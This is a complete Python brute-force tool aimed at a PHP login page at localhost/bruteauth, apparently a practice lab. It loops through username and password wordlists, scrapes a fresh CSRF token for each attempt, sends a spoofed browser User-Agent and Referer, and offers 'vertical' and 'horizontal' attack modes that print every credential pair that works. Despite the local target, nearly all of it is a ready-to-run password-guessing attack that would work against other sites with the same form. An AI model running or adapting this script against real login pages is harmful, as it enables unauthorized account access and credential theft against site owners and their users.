import requests
from bs4 import BeautifulSoup
import time

# URLs for login and authentication
LOGIN_URL = 'http://localhost/bruteauth/login.php'
AUTH_URL = 'http://localhost/bruteauth/authenticate.php'

# Load username and password lists
try:
    with open('usernames.txt', 'r') as file:
        usernames = [line.strip() for line in file.readlines()]

    with open('passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
except FileNotFoundError as e:
    print(f"Error: {e}")
    exit(1)

def load_cookie():
    """Load session cookie from file."""
    try:
        with open('browser_cookie.txt', 'r') as file:
            cookie_line = file.read().strip()
            key, value = cookie_line.split('=', 1)
            return {key: value}
    except Exception as e:
        print(f"Error loading cookie: {e}")
        exit(1)

def fetch_csrf_token(session):
    """Fetch CSRF token from the login page."""
    response = session.get(LOGIN_URL)
    if response.status_code != 200:
        print(f"Failed to retrieve login page. Status code: {response.status_code}")
        return None

    # Extract CSRF token from the page
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})

    if csrf_token is None:
        print("CSRF token not found.")
        return None

    return csrf_token['value']

def attempt_login(session, username, password, csrf_token):
    """Attempt to login with given username, password, and CSRF token."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Referer': LOGIN_URL  # Referer header to mimic browser behavior
    }

    login_data = {
        'username': username,
        'password': password,
        'csrf_token': csrf_token
    }

    # Perform the login request
    response = session.post(AUTH_URL, data=login_data, headers=headers, allow_redirects=False)

    # Debugging: print the response status, headers, and part of the response body
    # print(f"Response Status Code: {response.status_code}")
    # print(f"Response Headers: {response.headers}")
    # print(f"Response Body Snippet: {response.text[:500]}")  # First 500 characters of response body

    # Handle redirects
    if response.status_code == 302:
        print(f"Redirected to: {response.headers.get('Location')}")
        return True, response  # Login successful, redirection occurred

    return "Login successful!" in response.text, response  # Adjust based on your app's success message

# Define color codes
GREEN = "\033[32m"
RESET = "\033[0m"  # Reset to default color

def vertical_brute_force():
    """Perform vertical brute-force attack."""
    with requests.Session() as session:
        # Load cookie into the session
        session.cookies.update(load_cookie())

        # Skip the username "0" if it's present in the list
        filtered_usernames = [username for username in usernames if username != '0']

        # Loop through each username
        for username in filtered_usernames:
            print(f"Attempting passwords for Username: {username}")
            
            # Loop through all passwords for the current username
            for password in passwords:
                csrf_token = fetch_csrf_token(session)  # Fetch a new CSRF token for each attempt
                if csrf_token is None:
                    print("Failed to fetch CSRF token. Skipping.")
                    continue

                success, response = attempt_login(session, username, password, csrf_token)

                if success:
                    print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
                    break  # Break the inner loop as soon as the correct password is found
                elif "Invalid credentials" in response.text:
                    print(f"[FAIL] Username: {username}, Password: {password}")
                else:
                    print(f"[ERROR] Unexpected response for Username: {username}, Password: {password}")

                time.sleep(1)  # Sleep to prevent overwhelming the server

            print(f"Finished trying passwords for Username: {username}")



def horizontal_brute_force(single_username):
    """Perform horizontal brute-force attack for a single user."""
    with requests.Session() as session:
        # Load cookie into the session
        session.cookies.update(load_cookie())

        csrf_token = fetch_csrf_token(session)
        if csrf_token is None:
            print("Failed to fetch CSRF token. Aborting.")
            return

        for password in passwords:
            success, response = attempt_login(session, single_username, password, csrf_token)

            if success:
                print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
                return  # Exit after a successful login
            elif "Invalid credentials" in response.text:
                print(f"[FAIL] Password: {password}")
            else:
                print(f"[ERROR] Unexpected response for Password: {password}")

            time.sleep(1)  # Sleep to prevent overwhelming the server

# Choose the attack type
print("Select attack type: \n1. Vertical (multiple users, single password list)\n2. Horizontal (single user, multiple passwords)")
choice = input("Enter choice (1 or 2): ")

if choice == "1":
    vertical_brute_force()  # Calls vertical attack function
elif choice == "2":
    target_username = input("Enter the username for horizontal brute-force: ")
    horizontal_brute_force(target_username)  # Calls horizontal attack function
else:
    print("Invalid choice.")
